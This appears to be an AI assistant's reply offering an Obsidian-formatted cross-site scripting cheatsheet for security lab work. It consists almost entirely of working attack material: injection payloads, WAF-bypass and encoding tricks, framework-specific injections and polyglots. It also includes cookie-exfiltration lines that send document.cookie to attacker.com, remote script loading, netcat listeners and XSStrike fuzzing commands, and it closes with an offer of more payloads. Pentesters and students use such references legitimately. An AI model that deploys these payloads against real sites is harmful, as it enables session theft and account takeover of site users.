# 🛠️ Ultimate XSS Cheatsheet for Obsidian

```markdown
# 🎯 Cross-Site Scripting (XSS) Master Cheatsheet

*Based on PortSwigger Research & Web Security Academy*
*Last Updated: {{date}}*

---

## 📖 Table of Contents
- [[#🔰 Basic Payloads]]
- [[#🎨 Visual Modifications]]
- [[#🧩 DOM Manipulation]]
- [[#📡 External Interaction]]
- [[#⚡ Useful Commands]]
- [[#🎭 Event Handlers]]
- [[#🔣 Encoding & Obfuscation]]
- [[#⚛️ Framework-Specific]]
- [[#🛡️ WAF Bypass Techniques]]
- [[#📛 Classic & Legacy Vectors]]

---

## 🔰 Basic Payloads

### Standard Alert Payloads
```html
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
<body onload=alert(document.domain)>
```

### Alternative Execution
```html
<script>print()</script>
<plaintext>
<iframe srcdoc="<script>alert(1)</script>">
```

---

## 🎨 Visual Modifications

### UI Manipulation
```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://example.com/image.jpg"</script>
<script>document.title = 'HackTheBox Academy'</script>
```

---

## 🧩 DOM Manipulation

### Content Control
```html
<script>document.body.innerHTML = 'Page Replaced'</script>
<script>document.getElementById('element').remove()</script>
```

---

## 📡 External Interaction

### Data Exfiltration
```html
<script>new Image().src='http://attacker.com/?cookie='+document.cookie</script>
<script>fetch('http://attacker.com', {method: 'POST', body: document.cookie})</script>
```

### Remote Script Loading
```html
<script src="http://attacker.com/malicious.js"></script>
```

---

## ⚡ Useful Commands

### XSS Scanning
```bash
python xsstrike.py -u "http://target.com/page?param=test"
python xsstrike.py -r request.txt --fuzzer
```

### Server Setup
```bash
# HTTP Listener
sudo nc -lvnp 80
sudo php -S 0.0.0.0:80

# HTTPS Listener (for secure contexts)
sudo nc -lvnp 443
```

---

## 🎭 Event Handlers (No User Interaction)

### Auto-Execute Events
```html
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<video onloadstart=alert(1)><source></video>
<audio oncanplay=alert(1)><source></audio>
```

### Animation Events
```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

---

## 🔣 Encoding & Obfuscation

### HTML Encoding
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### JavaScript Encoding
```javascript
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

### Base64 Obfuscation
```html
<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>
```

---

## ⚛️ Framework-Specific

### AngularJS Injection
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

### Vue.js Injection
```html
<div v-html="''.constructor.constructor('alert(1)')()">a</div>
```

---

## 🛡️ WAF Bypass Techniques

### String Concatenation
```javascript
<script>window['al'+'ert'](document['dom'+'ain'])</script>
```

### Comment Obfuscation
```javascript
<script>window[/*foo*/'alert'/*bar*/](document.domain)</script>
```

### Alternative Objects
```javascript
<script>self['alert'](document.domain)</script>
<script>top['alert'](document.domain)</script>
<script>this['alert'](document.domain)</script>
<script>frames['alert'](document.domain)</script>
```

---

## 📛 Classic & Legacy Vectors

### Protocol-Based
```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)">
```

### IE-Specific (Legacy)
```html
<a href="vbscript:MsgBox(1)">XSS</a>
<div style="xss:expression(alert(1))">
```

---

## 🔄 Polyglot Payloads

### Multi-Context Polyglot
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Another Polyglot
```html
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

---

## 📦 Template for Lab Work

### Basic Test Request
```http
POST /comment.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

comment=TEST&post_id=123
```

### XSStrike Command
```bash
python3 xsstrike.py -u "https://target.com/comment" \
--data "csrf=token&postId=123&comment=XSSTEST&name=test&email=test@test.com" \
--headers "Cookie: session=abc123" \
--fuzzer
```

---

## 💡 Pro Tips

1. **Context Matters**: Always identify the injection context (HTML, JavaScript, attribute, etc.)
2. **Try All Locations**: Test every parameter - even hidden ones
3. **Encoding Variations**: Try different encoding schemes when blocked
4. **Event Handlers**: Some events don't require user interaction
5. **DOM Inspection**: Use browser dev tools to analyze execution context

```

This cheatsheet is organized for easy navigation in Obsidian with internal links and clear sections. The content is categorized logically from basic to advanced techniques, with practical examples ready for use.

To use this in Obsidian:
1. Create a new note
2. Paste this content
3. Use the outline view for easy navigation
4. Add your own notes and examples to each section

Would you like me to elaborate on any specific section or add more specialized payloads?